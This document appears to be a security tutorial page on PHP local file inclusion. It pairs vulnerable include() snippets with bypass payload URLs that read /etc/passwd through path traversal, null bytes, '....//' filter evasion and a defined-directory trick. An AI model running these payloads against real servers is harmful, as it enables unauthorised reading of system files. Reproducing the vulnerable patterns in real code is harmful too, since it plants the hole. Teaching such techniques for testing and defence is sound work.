---
sidebar_position: 2
---

# LFI 


## Inclue

The PHP code uses a `GET` request via the URL parameter `file` to include the file of the Page.


```php
<?PHP 
	include($_GET["file"]);
?>
```

We can access and Display any readable file on the server from the code above if there isn't any Input Validation. This works because there isn't a directory specified in the `include` function and **No Input Validation.**

```js
+----------------------------------------------------+
| URL: | http://website.com/get.php?file=/etc/passwd |
+----------------------------------------------------+
```

<br/>


## Include Directory

The `include` function call's PHP pages in the **includes Directory** only via **file** Parameters.

```php
<?PHP 
	include("includes/".$_GET['file']); 
?>
```

This  `include` function allows us to Include any called files into the **Current Page.**  We can break out of it Using `../`

```js
+---------------------------------------------------------------+
| URL: | http://website.com/get.php?file=../../../../etc/passwd |
+---------------------------------------------------------------+
```

<br/>


## NULL BYTE

This `include` function reads the input with `.php` at the end .This code specifies the file type to pass to the `include` function. 

```php
<?PHP 
	include("includes/".$_GET['file'].".php"); 
?>
```


To Bypass this we can use the **NULL BYTE:** `%00` Using Null Bytes is an Injection technique where URL-Encoded representation such as **%00** or **0x00** in HEX with User-Supplied data to terminate Strings. **(We are trying to trick the Web App into disregarding whatever comes after the Null Byte)**

:::danger NULL BYTE **%00** 

Fixed and Not Working with `PHP 5.3.4` and Above...

```js
+------------------------------------------------------------------+
| URL: | http://website.com/get.php?file=../../../../etc/passwd%00 |
+------------------------------------------------------------------+
```

:::

<br/>

## Keyword Filter

This Code Filter Keywords to avoid disclosing sensitive information. The **/etc/passwd** file is being filtered.

```php
<?PHP 
    if (substr($_GET['file'], -11, 11) != '/etc/passwd'){
             echo file_get_contents($_GET['file']);
    } else {
             echo 'You are not allowed to see source files!'."\n";
    }
?>
```

We can bypass this using the **NULL BYTE:** `%00`. Or the current Directory at the end of the filtered keyword `/.`

```js
+-------------------------------------------------------+
| URL: | http://website.com/get.php?file=/etc/passwd%00 |
+-------------------------------------------------------+

+-------------------------------------------------------+
| URL: | http://website.com/get.php?file=etc/passwd/.   |
+-------------------------------------------------------+
```

<br/>

## String Replace

The Code replaces the `../` with the Empty String.

```php
<?PHP 
	$file = str_replace('../', '', $_GET['file']);
	include("includes/$file");
?>
```

We can send the following PAYLOAD to bypass the Filtering: `....//....//....//....//etc/passwd`. This works because the PHP Filter only Matches and Replaces the first subset string `../` it finds and doesn't do another pass.

```js
+---------------------------------------------------------------------------+
| URL: | http://website.com/get.php?file=....//....//....//....//etc/passwd |
+---------------------------------------------------------------------------+
```

Some Filters can be Bypassed using this Method...

```js
+---------------------------------------------------------------------------+
| URL: | http://website.com/get.php?file=....\/....\/....\/....\/etc/passwd |
+---------------------------------------------------------------------------+
```

<br/>

## Defined Directory

This Code forces the `include` to read from a **Defined Directory** in this case the Directory is `Files`

```php
<?PHP 
  $profile = $_GET['file'];

  $pos = strpos($profile, "Files");
  if ($pos === false) {
  		exit("Access Denied!");
  }
    include($profile);
?>
```

To exploit the Defined Directory, we need to include the directory in the PAYLOAD.

```js
+-----------------------------------------------------------------------+
| URL: | http://website.com/get.php?file=Files../../../../../etc/passwd | 
+-----------------------------------------------------------------------+
```